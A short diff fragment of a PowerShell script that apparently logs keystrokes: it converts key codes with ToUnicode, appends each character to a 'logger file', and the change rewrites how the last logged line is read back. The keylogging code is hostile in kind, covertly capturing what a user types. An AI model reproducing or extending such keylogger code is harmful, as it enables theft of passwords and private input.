@@ -64,7 +64,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
             # add key to logger file
             [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode);
             Start-Sleep -Milliseconds 10;
-            $akdeniz = Get-Content -tail 1 $Path;
+            $akdeniz = Get-Content  $Path | Select-Object -last 1;
             foreach ($Line in $akdeniz) {
                $a = $Line.Remove(0, ($Line.Length -1));
                if ($a -eq "a"){
